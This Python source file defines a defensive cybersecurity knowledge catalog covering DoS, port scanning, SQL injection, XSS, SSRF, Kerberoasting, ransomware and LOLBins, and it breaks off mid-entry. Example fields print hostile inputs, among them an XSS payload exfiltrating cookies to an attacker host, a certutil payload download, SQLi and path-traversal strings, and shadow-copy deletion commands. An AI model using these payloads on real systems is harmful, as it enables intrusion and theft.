"""
SENTINEL AI — Comprehensive Cybersecurity Knowledge Engine (CyberKnowledgeEngine)

Provides in-depth, authoritative, grounded technical explanations across all primary
cybersecurity domains:
1. Network Security & Protocols
2. Web Application Security (OWASP Top 10)
3. Identity, Authentication & Active Directory
4. Malware, Threats & C2 Operations
5. Security Operations (SecOps), SIEM, EDR & Incident Response
6. Cryptography & Data Protection
7. Cloud, Container & Infrastructure Security
8. Zero Trust & Enterprise Architecture
"""

import re
from typing import Dict, Any, List, Optional, Tuple


class CyberKnowledgeItem:
    def __init__(
        self,
        key: str,
        title: str,
        domain: str,
        keywords: List[str],
        summary: str,
        mechanics: str,
        examples: str,
        detection: str,
        mitigation: str,
        mitre_ids: Optional[List[str]] = None
    ):
        self.key = key
        self.title = title
        self.domain = domain
        self.keywords = [k.lower() for k in keywords]
        self.summary = summary
        self.mechanics = mechanics
        self.examples = examples
        self.detection = detection
        self.mitigation = mitigation
        self.mitre_ids = mitre_ids or []

    def format_markdown(self) -> str:
        sections = [
            f"### {self.title}\n\n**Domain**: {self.domain}" + (f" | **MITRE ATT&CK**: {', '.join(self.mitre_ids)}" if self.mitre_ids else ""),
            f"**Overview**:\n{self.summary}",
            f"**Technical Mechanics**:\n{self.mechanics}",
        ]
        if self.examples:
            sections.append(f"**Real-World Scenario / Example**:\n{self.examples}")
        if self.detection:
            sections.append(f"**Detection & Threat Hunting**:\n{self.detection}")
        if self.mitigation:
            sections.append(f"**Remediation & Defense**:\n{self.mitigation}")
        return "\n\n".join(sections)


KNOWLEDGE_CATALOG: List[CyberKnowledgeItem] = [
    # -------------------------------------------------------------------------
    # 1. NETWORK SECURITY & PROTOCOLS
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="syn_flood",
        title="TCP SYN Flood Denial-of-Service Attack",
        domain="Network Transport Security",
        keywords=["syn flood", "tcp syn", "syn-ack", "embryonic connection", "backlog queue"],
        summary="A network-layer denial-of-service attack exploiting the TCP 3-way handshake to exhaust target server connection state memory.",
        mechanics=(
            "1. Attacker sends a high-volume flood of spoofed TCP SYN packets to a listening port (e.g., 80 or 443).\n"
            "2. Server allocates a Transmission Control Block (TCB) in its half-open connection backlog queue and responds with SYN-ACK.\n"
            "3. Attacker never transmits the concluding ACK; half-open connections remain in SYN_RECV state until the queue overflows, rejecting legitimate connections."
        ),
        examples="Volumetric floods originating from distributed botnets utilizing tools like hping3 or Mirai targeting web applications.",
        detection="Analyze asymmetric SYN without ACK ratios on perimeter firewalls and inspect netstat / ss connection state tables for saturated SYN_RECV counts.",
        mitigation="Enable cryptographic SYN Cookies (`sysctl -w net.ipv4.tcp_syncookies=1`), increase backlog queue (`net.ipv4.tcp_max_syn_backlog`), and deploy upstream DDoS scrubbing proxies.",
        mitre_ids=["T1498.001"]
    ),
    CyberKnowledgeItem(
        key="slowloris",
        title="DoS Slowloris Application Connection Starvation",
        domain="Application Layer Denial of Service",
        keywords=["slowloris", "slow http", "low and slow", "partial http headers", "mpm_worker"],
        summary="An asymmetric low-and-slow denial-of-service attack holding web server thread pools open using minimal bandwidth.",
        mechanics=(
            "1. Attacker establishes hundreds of concurrent HTTP connections to a web server.\n"
            "2. Sends partial HTTP headers at slow, irregular intervals (e.g. `X-a: b\\r\\n` every 15 seconds) without sending the terminating double CRLF (`\\r\\n\\r\\n`).\n"
            "3. Thread-per-connection web servers (like Apache mpm_prefork) hold worker threads open awaiting completion until `MaxRequestWorkers` is exhausted."
        ),
        examples="A single laptop running Slowloris Python scripts taking down an enterprise Apache web server generating less than 15 Kbps of bandwidth.",
        detection="Identify long-duration HTTP sessions with very low packet counts, high inter-arrival times, and incomplete header states.",
        mitigation="Deploy Apache `mod_reqtimeout` (`RequestReadTimeout header=10-20,MinRate=500`), front with event-driven reverse proxies (Nginx, Envoy), and enforce per-IP concurrent connection limits via iptables.",
        mitre_ids=["T1499.003"]
    ),
    CyberKnowledgeItem(
        key="port_scanning",
        title="Network Port Scanning & Service Discovery",
        domain="Network Reconnaissance",
        keywords=["port scan", "port scanning", "nmap", "syn scan", "stealth scan", "xmas scan", "service discovery"],
        summary="The systematic probing of a target host's IP and port range to determine open network services, operating systems, and listening software versions.",
        mechanics=(
            "- **TCP SYN Scan (-sS / Stealth Scan)**: Sends SYN; open ports reply with SYN-ACK (scanner immediately sends RST to avoid completing handshake); closed ports reply with RST.\n"
            "- **TCP Connect Scan (-sT)**: Completes the full 3-way handshake; slower and logged by target OS applications.\n"
            "- **UDP Scan (-sU)**: Sends raw UDP packets; open ports may respond with service data or remain silent; closed ports return ICMP Port Unreachable (Type 3, Code 3).\n"
            "- **FIN / XMAS / NULL Scans**: Exploit RFC 793 TCP state rules where closed ports respond with RST while open ports drop the malformed packet."
        ),
        examples="Adversary executing `nmap -sS -p- -T4 target.corp.lan` prior to targeted service exploitation.",
        detection="Alert on rapid sequential connection attempts across multiple destination ports originating from a single source IP in IDS/IPS and firewall logs.",
        mitigation="Enforce strict ingress firewall rules (block all unused ports), implement port knock daemons, deploy deceptive honeypots, and drop scanning IPs via automated rate limiting.",
        mitre_ids=["T1046"]
    ),
    CyberKnowledgeItem(
        key="arp_poisoning",
        title="ARP Spoofing & Man-in-the-Middle (MitM) Attacks",
        domain="Data Link Layer Security (Layer 2)",
        keywords=["arp spoofing", "arp poisoning", "mitm", "man-in-the-middle", "gratuitous arp", "ettercap"],
        summary="An attack where an adversary broadcasts forged Address Resolution Protocol (ARP) messages across a local area network to link their MAC address to the IP of a legitimate default gateway.",
        mechanics=(
            "1. Attacker broadcasts gratuitous ARP replies asserting that the Default Gateway IP belongs to the Attacker MAC.\n"
            "2. Target hosts update their local ARP cache tables with the poisoned mapping.\n"
            "3. Outbound network traffic from victim hosts is forwarded to the attacker, enabling packet sniffing, credential harvesting, or payload alteration before forwarding to the true gateway."
        ),
        examples="Adversary on corporate Wi-Fi using `arpspoof` or Bettercap to intercept unencrypted internal HTTP/DNS traffic.",
        detection="Monitor local ARP traffic for conflicting MAC-IP pairings and high-frequency gratuitous ARP transmissions via tools like `arpwatch`.",
        mitigation="Enable **Dynamic ARP Inspection (DAI)** on managed network switches coupled with **DHCP Snooping**, configure static ARP bindings on critical hosts, and enforce end-to-end encryption (TLS, IPsec).",
        mitre_ids=["T1557.002"]
    ),
    CyberKnowledgeItem(
        key="dns_tunneling",
        title="DNS Tunneling & Data Exfiltration",
        domain="Covert Channels & Protocol Abuse",
        keywords=["dns tunneling", "dns exfiltration", "shannon entropy", "iodine", "dnscat", "txt record exfil"],
        summary="Abusing the Domain Name System to establish covert command-and-control channels or exfiltrate sensitive files through perimeter firewalls allowing outbound UDP 53.",
        mechanics=(
            "1. Attacker encodes stolen data (base64/hex) into subdomain query labels: `<encoded_data>.tunnel.attacker.com`.\n"
            "2. Internal recursive DNS resolvers forward the request to the attacker-controlled authoritative nameserver.\n"
            "3. Attacker nameserver decodes data and sends C2 instructions or acknowledgments inside TXT / CNAME responses."
        ),
        examples="Compromised endpoint exfiltrating customer PII via continuous 45-character base64-encoded TXT DNS queries to a dynamic DNS host.",
        detection="Calculate Shannon entropy on queried subdomain labels ($H \\ge 3.8$), inspect label lengths ($>35$ chars), and alert on abnormal frequencies of TXT/NULL record queries.",
        mitigation="Enforce internal recursive DNS resolvers, implement **DNS Response Policy Zones (RPZ) / DNS Sinkholing**, and block direct external egress on UDP/TCP port 53.",
        mitre_ids=["T1048.003", "T1071.004"]
    ),
    CyberKnowledgeItem(
        key="ids_vs_ips",
        title="Intrusion Detection System (IDS) vs Intrusion Prevention System (IPS)",
        domain="Network Defense Topologies",
        keywords=["ids vs ips", "ids and ips", "difference between ids and ips", "snort", "suricata", "tap", "span"],
        summary="A fundamental architectural comparison between passive out-of-band monitoring and active inline threat interception.",
        mechanics=(
            "- **IDS (Passive Out-of-Band)**: Connected to a network TAP or switch SPAN/mirror port. Copies and inspects traffic without latency impact. Cannot actively drop packets inline; alerts analysts or sends TCP RST.\n"
            "- **IPS (Active Inline)**: Positioned directly in the network packet data path. Every packet traverses the engine. Can actively drop malicious packets, reset sessions, and dynamically update firewall access rules."
        ),
        examples="Snort deployed in passive TAP mode for visibility vs Palo Alto / Fortinet NGFW deployed inline dropping exploit traffic.",
        detection="Signature-based pattern matching (Snort/Suricata rules), protocol anomaly verification, and statistical baseline thresholding.",
        mitigation="Deploy IDS at core aggregation layers for deep forensic visibility and IPS at perimeter boundaries configured with fail-open bypass hardware to prevent network outages.",
        mitre_ids=["T1562.001"]
    ),
    CyberKnowledgeItem(
        key="firewalls_and_spi",
        title="Firewalls & Stateful Packet Inspection (SPI)",
        domain="Perimeter Network Security",
        keywords=["firewall", "stateful packet inspection", "spi", "ngfw", "packet filter", "iptables"],
        summary="Security appliances that monitor and filter incoming and outgoing network traffic based on predefined security rule policies.",
        mechanics=(
            "- **Stateless Packet Filter**: Examines each packet in isolation (Source IP, Dest IP, Port, Protocol) without connection awareness.\n"
            "- **Stateful Packet Inspection (SPI)**: Tracks the full state of active connections in a state table (`NEW`, `ESTABLISHED`, `RELATED`). Automatically allows returning inbound traffic for legitimately initiated outbound connections.\n"
            "- **Next-Generation Firewall (NGFW)**: Integrates SPI with Layer 7 Deep Packet Inspection (DPI), user identity mapping, SSL/TLS decryption, and integrated intrusion prevention."
        ),
        examples="Linux `iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT` permitting inbound response packets.",
        detection="Log rejected connection attempts, out-of-sequence TCP flags, and state table connection overflows.",
        mitigation="Enforce Default Deny ingress/egress policies, segment networks into isolated security zones, and decrypt TLS for deep application inspection.",
        mitre_ids=["T1562.004"]
    ),

    # -------------------------------------------------------------------------
    # 2. WEB APPLICATION SECURITY (OWASP TOP 10)
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="sql_injection",
        title="SQL Injection (SQLi) Vulnerabilities & Defenses",
        domain="Web Application Security (OWASP A03:2021)",
        keywords=["sql injection", "sqli", "union select", "sqlmap", "prepared statements", "parameterized queries"],
        summary="A severe injection vulnerability allowing attackers to interfere with database queries made by an application, exposing or altering underlying data.",
        mechanics=(
            "- **In-Band SQLi**: Exploits same channel; includes **Union-Based** (`' UNION SELECT username, password_hash FROM users--`) and **Error-Based** (triggering database error messages revealing schema data).\n"
            "- **Inferential / Blind SQLi**: Application does not return data directly. Includes **Boolean Blind** (evaluating true/false HTTP response lengths) and **Time-Based Blind** (`' OR IF(1=1, SLEEP(5), 0)--`).\n"
            "- **Out-of-Band (OAST)**: Database triggered to make external DNS/HTTP requests containing extracted data (e.g. `xp_dirtree`)."
        ),
        examples="Attacker bypassing login by submitting `' OR '1'='1' --` in the password parameter of an insecure authentication script.",
        detection="Monitor WAF logs for SQL meta-characters, UNION SELECT strings, comment dashes (`--`, `/*`), and database sleep commands.",
        mitigation="Always enforce **Parameterized Queries / Prepared Statements** or use reputable ORMs. Parameterization separates executable SQL instructions from user data at the database parser level. Avoid dynamic string concatenation.",
        mitre_ids=["T1190"]
    ),
    CyberKnowledgeItem(
        key="cross_site_scripting",
        title="Cross-Site Scripting (XSS: Stored, Reflected, DOM)",
        domain="Web Application Security (OWASP A03:2021)",
        keywords=["xss", "cross site scripting", "stored xss", "reflected xss", "dom xss", "content security policy", "csp"],
        summary="A client-side code injection vulnerability allowing attackers to execute malicious JavaScript in the victim's browser session.",
        mechanics=(
            "- **Stored XSS (Persistent)**: Injected malicious payload is stored permanently in the database (e.g., comments, forum posts) and executed whenever other users view the page.\n"
            "- **Reflected XSS**: Injected script is reflected off the web server in an immediate HTTP response (e.g., search queries, error messages) via crafted phishing links.\n"
            "- **DOM-Based XSS**: Vulnerability exists purely in client-side code where unsafe JavaScript sources (e.g. `location.search`) are written directly to execution sinks (e.g. `innerHTML`, `document.write`)."
        ),
        examples="Attacker posting `<script>fetch('https://c2.attacker.com/steal?c=' + document.cookie)</script>` in a forum comment to steal session cookies.",
        detection="Audit HTTP parameters for `<script>`, `onerror=`, `javascript:` payloads in WAF logs and browser console CSP violation reports.",
        mitigation="Apply context-aware output encoding (HTML, JavaScript, URL encoding), enforce a strict **Content Security Policy (CSP)** restricting inline scripts, and set `HttpOnly` flags on session cookies to block JavaScript access.",
        mitre_ids=["T1059.007", "T1189"]
    ),
    CyberKnowledgeItem(
        key="cross_site_request_forgery",
        title="Cross-Site Request Forgery (CSRF) & SameSite Defenses",
        domain="Web Application Security (OWASP A01:2021)",
        keywords=["csrf", "cross-site request forgery", "samesite", "anti-csrf token", "session riding"],
        summary="An attack tricking an authenticated victim's browser into executing unwanted actions on a trusted web application.",
        mechanics=(
            "1. Victim logs into their banking portal (`bank.com`) and receives an authenticated session cookie.\n"
            "2. Without logging out, victim visits malicious site `attacker.com`.\n"
            "3. Malicious site triggers a background POST request (`<form action='https://bank.com/transfer' method='POST'>`).\n"
            "4. The browser automatically attaches the victim's authenticated `bank.com` cookies, executing the transfer without user consent."
        ),
        examples="Forged transaction transferring funds via background form submissions on third-party sites.",
        detection="Analyze incoming state-changing requests lacking valid cryptographic anti-CSRF token headers or containing unexpected `Origin` / `Referer` headers.",
        mitigation="Configure session cookies with `SameSite=Strict` or `SameSite=Lax`, implement cryptographically random **Anti-CSRF Synchronization Tokens** validated on every state-changing POST/PUT/DELETE request, and require re-authentication for sensitive actions.",
        mitre_ids=["T1189"]
    ),
    CyberKnowledgeItem(
        key="ssrf_and_cloud_metadata",
        title="Server-Side Request Forgery (SSRF) & Cloud IMDSv2 Defense",
        domain="Web Application & Cloud Security",
        keywords=["ssrf", "server-side request forgery", "169.254.169.254", "imdsv2", "cloud metadata", "aws ec2 metadata"],
        summary="A vulnerability where a back-end web application is coerced into making unauthorized HTTP requests to internal microservices or cloud instance metadata.",
        mechanics=(
            "- **Vulnerability**: Application accepts a user-provided URL parameter (e.g. `?avatar_url=...`) and fetches it server-side without validation.\n"
            "- **Cloud Exploitation**: Attacker inputs `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to extract temporary IAM role keys.\n"
            "- **IMDSv1 vs IMDSv2**: Under IMDSv1, a simple GET request extracts credentials. **IMDSv2** requires a session-oriented `PUT` request with token TTL headers, and enforces a network hop limit of 1 to block forwarded requests."
        ),
        examples="Capital One breach where an SSRF vulnerability in a WAF allowed access to EC2 metadata, leaking AWS credentials.",
        detection="Alert on egress HTTP requests originating from application tiers destined for link-local address `169.254.169.254` or internal private subnets (RFC 1918).",
        mitigation="Enforce AWS **IMDSv2** across all EC2 instances, validate user URLs against strict domain allowlists, disable HTTP redirects in server HTTP clients, and isolate application networks from metadata services.",
        mitre_ids=["T1190", "T1078.004"]
    ),
    CyberKnowledgeItem(
        key="path_traversal_lfi",
        title="Path Traversal & Local File Inclusion (LFI)",
        domain="Web Application Security (OWASP A01:2021)",
        keywords=["path traversal", "directory traversal", "lfi", "local file inclusion", "etc/passwd", "dot dot slash"],
        summary="Vulnerabilities allowing attackers to read arbitrary files from the server file system by injecting dot-dot-slash (`../`) directory navigation sequences.",
        mechanics=(
            "1. Application dynamically includes files based on user input: `include('/var/www/uploads/' + $_GET['file'])`.\n"
            "2. Attacker supplies `../../../../etc/passwd` or `..\\..\\windows\\win.ini`.\n"
            "3. Path resolution traverses out of the web root into root system directories, displaying sensitive operating system credentials or application source code."
        ),
        examples="Attacker reading `/etc/shadow` or database configuration files containing cleartext credentials.",
        detection="Audit HTTP parameters for URL-encoded dot-dot-slash sequences (`%2e%2e%2f`, `..%2f`) in WAF access logs.",
        mitigation="Use strictly enforced file ID lookups instead of direct file paths, resolve canonical absolute paths (`os.path.realpath`) and assert they remain within the authorized base directory, and run web servers in chroot jails with least privileges.",
        mitre_ids=["T1059.004", "T1083"]
    ),

    # -------------------------------------------------------------------------
    # 3. IDENTITY, AUTHENTICATION & ACTIVE DIRECTORY
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="brute_force_vs_spraying",
        title="Brute-Force vs Password Spraying Authentication Attacks",
        domain="Credential Access & Identity Security",
        keywords=["brute force", "password spraying", "difference between brute-force and password spraying", "credential stuffing", "t1110"],
        summary="A critical distinction between vertical single-account credential guessing and horizontal low-frequency multi-account evasion.",
        mechanics=(
            "- **Brute-Force Attack**: Attacker targets **one specific account** (e.g. `admin`, `root`) and systematically submits hundreds or thousands of password guesses in rapid succession. High velocity; triggers threshold lockouts quickly.\n"
            "- **Password Spraying Attack**: Attacker targets **hundreds of distinct user accounts**, testing only one or two common passwords (e.g. `Winter2026!`, `Company123!`) per account over extended time intervals. Low velocity per user; purposefully evades account lockout thresholds."
        ),
        examples="SSH brute force targeting `bastion-01:root` vs Okta / Azure AD password spray across 5,000 corporate email accounts.",
        detection="Correlate authentication failure events across multiple usernames originating from the same source IP/subnet over a sliding window (Sigma rule `SIGMA-AUTH-SPRAY`).",
        mitigation="Enforce mandatory Multi-Factor Authentication (MFA), deploy smart lockout policies that block offending IPs rather than locking user accounts, and enforce strong, non-seasonal passphrases.",
        mitre_ids=["T1110.001", "T1110.003"]
    ),
    CyberKnowledgeItem(
        key="soc_bruteforce_log_analysis",
        title="Linux Authentication Log Analysis & Automated Brute-Force Detection Lab",
        domain="Security Operations (SecOps), SOC Labs & Threat Hunting",
        keywords=[
            "zacariah", "zacariahcybersec", "log-analysis-brute-force-detection",
            "brute force detection script", "python log analysis", "auth.log analysis",
            "detect brute force in python", "ssh log detector", "failed password python"
        ],
        summary="A practical SOC analyst workflow and automation lab demonstrating how to detect, analyze, and mitigate SSH brute-force and password spraying attacks using Python scripts on Linux authentication logs.",
        mechanics=(
            "- **Linux Authentication Telemetry (`/var/log/auth.log` or `/var/log/secure`)**: OpenSSH daemons record every authentication attempt with timestamps, PID, outcome, username, source IP, and port.\n"
            "- **Attack Signatures**: Rapid succession of `Failed password for invalid user <user> from <ip>` or `Failed password for root from <ip>` indicating automated credential guessing.\n"
            "- **Python Log Parsing Strategies**:\n"
            "  - *Basic Token Splitting*: Parsing tokens via `line.split()[-3]` works for simple standard formats, but is vulnerable to line variations (e.g. `invalid user` adds extra tokens).\n"
            "  - *Production Regex Parsing*: Using compiled regular expressions like `r'Failed password for (?:invalid user )?(\\S+) from (\\S+) port (\\d+)'` guarantees accurate extraction of username, IP, and port regardless of user validity flags.\n"
            "- **Threshold vs Sliding Window Detection**: Simple counters track total failures per IP; enterprise SIEM/SOC platforms employ sliding time-windows (e.g. $\\ge 5$ failures within 60 seconds) to filter out human typos."
        ),
        examples="Zacariah SOC Lab: Simulating a 5-attempt SSH brute-force on Kali Linux from IP `192.168.1.10` targeting `admin`, `root`, `test`, `user` in 8 seconds, followed by authorized login from `192.168.1.5` for user `zacariah`.",
        detection="Scan `auth.log` for repeated `Failed password` lines; aggregate failure counts and distinct targeted usernames by source IP over time. Alert when threshold is breached.",
        mitigation=(
            "1. **Host-Level Firewall**: Deploy `iptables -A INPUT -s <attacker_ip> -j DROP` or `nftables`.\n"
            "2. **Intrusion Prevention**: Configure Fail2ban (`/etc/fail2ban/jail.local`) with `maxretry = 3` and `bantime = 1d`.\n"
            "3. **OpenSSH Hardening**: Set `PermitRootLogin no`, `PasswordAuthentication no` (require ED25519 public keys), and configure MFA with PAM Duo / Google Authenticator.\n"
            "4. **SOAR Automation**: Trigger GENESIS AI playbook `PB-SSH-BRUTE-01` for instantaneous stateful packet filtering."
        ),
        mitre_ids=["T1110.001", "T1110.003", "T1021.004", "T1078"]
    ),
    CyberKnowledgeItem(
        key="kerberoasting",
        title="Kerberoasting Active Directory Attack & Mitigation",
        domain="Active Directory Post-Exploitation",
        keywords=["kerberoasting", "kerberoast", "spn", "tgs", "rc4-hmac", "service principal name", "hashcat", "4769"],
        summary="An Active Directory post-exploitation technique where any valid domain user requests Kerberos service tickets for Service Principal Names (SPNs) to crack service account passwords offline.",
        mechanics=(
            "1. Any authenticated domain user queries Active Directory for accounts with configured Service Principal Names (SPNs) (e.g., `MSSQLSvc/sql01.corp.lan:1433`).\n"
            "2. Attacker requests a Kerberos Ticket Granting Service (**TGS**) ticket from the Domain Controller (KDC) for that SPN.\n"
            "3. The KDC encrypts the service ticket using the password hash of the service account.\n"
            "4. Attacker extracts the ticket from memory and cracks the hash offline using dictionary tools (Hashcat / John the Ripper) without generating failed logon alerts on the service server."
        ),
        examples="Compromised workstation user extracting hashes for high-privilege service accounts running database or web servers.",
        detection="Monitor Windows Security Event ID **4769** for anomalous volumes of TGS requests, especially requesting legacy `0x17` (`RC4-HMAC`) encryption for non-machine accounts.",
        mitigation="Migrate service accounts to **Group Managed Service Accounts (gMSA)** with automated 128-character complex passwords, enforce AES-256 Kerberos encryption (`0x12`), and assign service accounts least privileges.",
        mitre_ids=["T1558.003"]
    ),
    CyberKnowledgeItem(
        key="asrep_roasting",
        title="AS-REP Roasting Active Directory Attack",
        domain="Active Directory Credential Access",
        keywords=["as-rep roasting", "asrep roasting", "dont_req_preauth", "kerberos pre-authentication", "4768"],
        summary="An attack targeting Active Directory user accounts that have Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`).",
        mechanics=(
            "1. Normally, a user requesting a Ticket Granting Ticket (TGT) must encrypt a timestamp with their password hash to verify identity (**Pre-Authentication**).\n"
            "2. If `Do not require Kerberos preauthentication` is checked on an account, an attacker can send an unauthenticated `AS-REQ` for that username.\n"
            "3. The KDC immediately replies with an `AS-REP` containing a session key encrypted with the target user's password hash.\n"
            "4. Attacker captures the AS-REP message and cracks the password hash offline."
        ),
        examples="Attacker without domain credentials querying domain controllers for pre-auth disabled accounts and cracking user passwords.",
        detection="Audit Windows Security Event ID **4768** where `Pre-Authentication Type` is `0` (None).",
        mitigation="Query Active Directory (`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}`) and ensure Kerberos pre-authentication is enforced on all domain accounts.",
        mitre_ids=["T1558.004"]
    ),
    CyberKnowledgeItem(
        key="pass_the_hash_and_ticket",
        title="Pass-the-Hash (PTH) & Pass-the-Ticket (PTT)",
        domain="Lateral Movement & Defense Evasion",
        keywords=["pass the hash", "pass the ticket", "pth", "ptt", "mimikatz", "golden ticket", "silver ticket", "krbtgt"],
        summary="Techniques where adversaries reuse stolen authentication artifacts (NTLM hashes or Kerberos tickets) to authenticate to remote systems without cracking cleartext passwords.",
        mechanics=(
            "- **Pass-the-Hash (PTH)**: Adversary extracts NTLM hash from LSASS memory using Mimikatz and presents it directly to remote services (SMB/RPC) using NTLM authentication.\n"
            "- **Pass-the-Ticket (PTT)**: Adversary steals Kerberos TGT/TGS tickets from memory (`sekurlsa::tickets`) and injects them into their current logon session to access domain services.\n"
            "- **Golden Ticket**: Forged TGT generated using the compromised `krbtgt` domain account NTLM/AES key, granting unrestricted domain access.\n"
            "- **Silver Ticket**: Forged TGS generated using a specific service account password hash, granting access to that service without touching the KDC."
        ),
        examples="Adversary dumping LSASS on a compromised workstation, obtaining local admin NTLM hash, and passing the hash to move laterally to a file server.",
        detection="Alert on NTLM logons (Logon Type 3) across internal network boundaries where Kerberos is standard, and inspect LSASS process access via Sysmon Event ID 10.",
        mitigation="Enforce **Windows Defender Credential Guard**, add privileged domain users to the **Protected Users** security group (which disables NTLM and RC4), deploy LAPS (Local Administrator Password Solution), and reset the `krbtgt` password twice in the event of domain compromise.",
        mitre_ids=["T1550.002", "T1558.001", "T1558.002"]
    ),
    CyberKnowledgeItem(
        key="mfa_and_fido2",
        title="Multi-Factor Authentication (MFA) Protocols & Bypasses",
        domain="Identity Security & Authentication",
        keywords=["mfa", "multi-factor authentication", "totp", "fido2", "webauthn", "sim swapping", "mfa fatigue", "push bombing"],
        summary="Security mechanisms requiring two or more independent authentication factors, and modern adversary techniques used to bypass them.",
        mechanics=(
            "- **Factors**: Something you know (password), Something you have (hardware key, authenticator app), Something you are (biometrics).\n"
            "- **Weak MFA**: SMS OTP (vulnerable to SIM Swapping and SS7 network interception); Email OTP (compromised if email account breached).\n"
            "- **Strong MFA**: TOTP (Time-based One-Time Password RFC 6238); **FIDO2 / WebAuthn** hardware security keys (cryptographically bound to origin domain, immune to reverse-proxy phishing like Evilginx).\n"
            "- **Bypass Tactics**: **MFA Fatigue / Push Bombing** (inundating victim with push notifications until accepted); **Reverse-Proxy Phishing** (intercepting session cookies)."
        ),
        examples="Lapsus$ group compromising corporate identities by repeatedly sending push notifications at 2:00 AM until the victim accepted.",
        detection="Alert on high volumes of denied MFA prompts followed by an accepted prompt, and correlate concurrent logons from geographically distant IP addresses.",
        mitigation="Enforce phishing-resistant **FIDO2 / WebAuthn** keys, enable number matching on push notifications, and enforce device health conditional access policies.",
        mitre_ids=["T1556", "T1621"]
    ),

    # -------------------------------------------------------------------------
    # 4. MALWARE, THREATS & C2 OPERATIONS
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="ransomware_mechanics",
        title="Ransomware Architecture & Behavioral Indicators",
        domain="Endpoint Security & Malware Analysis",
        keywords=["ransomware", "file encryption", "vssadmin", "shadow copies", "canary files", "lockbit"],
        summary="Malicious software designed to encrypt files on target systems and demand ransom payments for decryption keys.",
        mechanics=(
            "1. **Initial Access**: Delivered via phishing, compromised RDP credentials, or software vulnerability exploitation.\n"
            "2. **Inhibition of System Recovery**: Executes commands like `vssadmin.exe delete shadows /all /quiet`, `wmic shadowcopy delete`, or `bcdedit /set {default} recoveryenabled No` to prevent local file restoration.\n"
            "3. **Hybrid Encryption**: Generates a random symmetric key (e.g. AES-256) per file for high-speed encryption, then encrypts the symmetric key with an attacker-held asymmetric public key (e.g. RSA-2048/4096).\n"
            "4. **Extortion Note**: Drops text/HTML ransom notes on desktops and directories."
        ),
        examples="LockBit, BlackCat (ALPHV), or Ryuk campaigns paralyzing corporate networks within hours.",
        detection="Monitor EDR telemetry for rapid file rename and modification velocity, anomalous entropy increases in user directories, execution of `vssadmin` shadow copy deletion, and tampering with canary decoy files.",
        mitigation="Maintain immutable offline / air-gapped backups (3-2-1 backup strategy), enforce application whitelisting, restrict access to backup repositories, and deploy automated EDR host isolation upon mass file encryption detection.",
        mitre_ids=["T1486", "T1490"]
    ),
    CyberKnowledgeItem(
        key="c2_beaconing_and_evasion",
        title="Command and Control (C2) Beaconing & Evasion",
        domain="Adversary Communications & Evasion",
        keywords=["c2 beaconing", "beaconing", "jitter", "cobalt strike", "domain generation algorithms", "dga", "fast flux"],
        summary="Persistent outbound network communications from compromised endpoints to external adversary command servers.",
        mechanics=(
            "- **Heartbeat / Beaconing**: Compromised agent checks in periodically over HTTP/HTTPS, DNS, or WebSockets for pending operator commands.\n"
            "- **Timing Jitter**: Randomizes sleep intervals (e.g. 60 seconds with 20% jitter = $48 - 72\\text{ s}$) to disrupt Fourier frequency analysis and static interval alerts.\n"
            "- **Domain Generation Algorithms (DGA)**: Algorithmic generation of hundreds of domain names daily based on seed dates, ensuring resilience against domain takedowns."
        ),
        examples="Cobalt Strike beacon communicating with AWS cloud infrastructure using HTTPS malleable C2 profiles mimicking legitimate telemetry.",
        detection="Analyze statistical inter-arrival time coefficient of variation in firewall netflow, inspect TLS client JA3/JA4 fingerprints, and alert on connections to Newly Registered Domains (NRDs).",
        mitigation="Deploy TLS-decrypting outbound proxies, enforce domain category allowlists, block dynamic DNS providers, and isolate infected endpoints at the switch port level.",
        mitre_ids=["T1071.001", "T1568.002"]
    ),
    CyberKnowledgeItem(
        key="living_off_the_land",
        title="Living-off-the-Land Binaries (LOLBins / LOLBas)",
        domain="Defense Evasion & Execution",
        keywords=["lolbins", "lolbas", "certutil", "powershell -enc", "bitsadmin", "wmic", "mshta", "fileless malware"],
        summary="The adversary practice of utilizing legitimate, pre-installed operating system utilities to execute malicious payloads, download tools, or evade antivirus.",
        mechanics=(
            "- **`certutil.exe`**: Legitimate certificate tool abused to download files: `certutil -urlcache -split -f http://c2/payload.exe`.\n"
            "- **`powershell.exe -enc`**: Encoded Base64 commands executing in-memory scripts to evade command-line string logging.\n"
            "- **`mshta.exe`**: Executes remote HTML Applications (HTA) containing VBScript or JScript directly in memory.\n"
            "- **`bitsadmin.exe`**: Abused to schedule stealthy background download jobs."
        ),
        examples="Adversary downloading and executing a Cobalt Strike stager using `certutil.exe` without dropping a custom compiler on disk.",
        detection="Enable PowerShell Script Block Logging (Event ID 4104) and Sysmon Process Creation (Event ID 1). Alert on suspicious parent-child process relationships (e.g., `word.exe` spawning `powershell.exe`).",
        mitigation="Enforce **AppLocker / Windows Defender Application Control (WDAC)** in Constrained Language Mode, restrict non-administrative access to dangerous LOLBins, and monitor command-line arguments via EDR.",
        mitre_ids=["T1059.001", "T1105", "T1218"]
    ),

    # -------------------------------------------------------------------------
    # 5. SECOPS, SIEM, EDR & INCIDENT RESPONSE
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="siem_and_edr",
        title="SIEM vs EDR: Architecture, Correlation & Telemetry",
        domain="Security Operations & Detection Engineering",
        keywords=["siem vs edr", "siem", "edr", "xdr", "soc tiers", "correlation rules", "sysmon"],
        summary="The complementary security monitoring technologies powering modern Security Operations Centers (SOC).",
        mechanics=(
            "- **SIEM (Security Information & Event Management)**: Centralizes, parses, and normalizes logs from heterogeneous sources (firewalls, Active Directory, cloud providers, proxies). Performs multi-source correlation rules over time-series data.\n"
            "- **EDR (Endpoint Detection & Response)**: Lightweight agent installed directly on endpoints. Collects real-time kernel telemetry (process creation, DLL injection, registry modifications, network sockets). Provides active response (host isolation, process termination, file quarantine)."
        ),
        examples="Splunk / Sentinel SIEM receiving firewall alerts correlated with CrowdStrike / SentinelOne EDR host process telemetry.",
        detection="SIEM aggregates indicators across layers (e.g. firewall blocked outbound IP correlated with EDR flagging PowerShell connecting to that IP).",
        mitigation="Integrate SIEM and EDR via SOAR playbooks to automatically isolate endpoints when high-confidence correlation thresholds trigger.",
        mitre_ids=["T1082"]
    ),
    CyberKnowledgeItem(
        key="incident_response_lifecycle",
